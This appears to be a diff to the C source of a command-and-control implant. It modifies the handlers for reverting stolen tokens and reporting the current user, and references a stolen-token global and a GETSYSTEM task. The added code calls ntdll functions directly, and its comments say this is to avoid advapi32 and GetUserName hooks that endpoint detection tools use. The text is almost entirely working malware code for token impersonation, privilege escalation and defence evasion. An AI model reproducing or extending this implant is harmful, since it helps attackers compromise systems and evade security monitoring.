@@ -2987,15 +2987,50 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, out, ""); free(out);
     }
     else if (strcmp(type_upper, "TOKEN_DROP") == 0 || strcmp(type_upper, "REV2SELF") == 0) {
-        RevertToSelf();
+        /* NtSetInformationThread(ThreadImpersonationToken=5, NULL) — avoids advapi32 hook */
+        typedef LONG (WINAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
+        HMODULE hNT = GetModuleHandleA("ntdll.dll");
+        pNtSIT NtSIT = hNT ? (pNtSIT)GetProcAddress(hNT, "NtSetInformationThread") : NULL;
+        HANDLE hNull = NULL;
+        if (NtSIT) NtSIT(GetCurrentThread(), 5 /*ThreadImpersonationToken*/, &hNull, sizeof(hNull));
+        else RevertToSelf();
         HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_stolen_token, NULL);
         if (old) CloseHandle(old);
         agent_send_result(task->id, "[+] reverted to original token", "");
     }
     else if (strcmp(type_upper, "TOKEN_WHOAMI") == 0) {
-        char buf[256]={0}; DWORD sz=sizeof(buf);
-        GetUserNameA(buf, &sz);
-        agent_send_result(task->id, buf, "");
+        /* NT path: OpenThreadToken → NtQueryInformationToken → LookupAccountSidW
+         * Avoids GetUserNameA/W which are commonly hooked by EDRs. */
+        typedef LONG (WINAPI *pNtQIT)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+        HMODULE hNT = GetModuleHandleA("ntdll.dll");
+        pNtQIT NtQIT = hNT ? (pNtQIT)GetProcAddress(hNT, "NtQueryInformationToken") : NULL;
+        char out[512] = {0};
+        HANDLE hTok = NULL;
+        if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hTok))
+            OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok);
+        if (hTok && NtQIT) {
+            ULONG needed = 0;
+            NtQIT(hTok, 1 /*TokenUser*/, NULL, 0, &needed);
+            if (needed > 0) {
+                BYTE *tub = (BYTE*)malloc(needed);
+                if (tub && NtQIT(hTok, 1, tub, needed, &needed) == 0) {
+                    TOKEN_USER *tu = (TOKEN_USER*)tub;
+                    WCHAR wuser[128]={0}, wdom[128]={0};
+                    DWORD ulen=128, dlen=128;
+                    SID_NAME_USE stype=SidTypeUnknown;
+                    if (LookupAccountSidW(NULL, tu->User.Sid, wuser, &ulen, wdom, &dlen, &stype)) {
+                        char u8[128]={0}, d8[128]={0};
+                        WideCharToMultiByte(CP_UTF8,0,wdom,-1,d8,sizeof(d8)-1,NULL,NULL);
+                        WideCharToMultiByte(CP_UTF8,0,wuser,-1,u8,sizeof(u8)-1,NULL,NULL);
+                        snprintf(out, sizeof(out), "%s\\%s", d8, u8);
+                    }
+                }
+                free(tub);
+            }
+        }
+        if (!out[0]) { DWORD sz=sizeof(out); GetUserNameA(out, &sz); }
+        if (hTok) CloseHandle(hTok);
+        agent_send_result(task->id, out, "");
     }
     else if (strcmp(type_upper, "GETSYSTEM") == 0) {
         char *out = get_system();
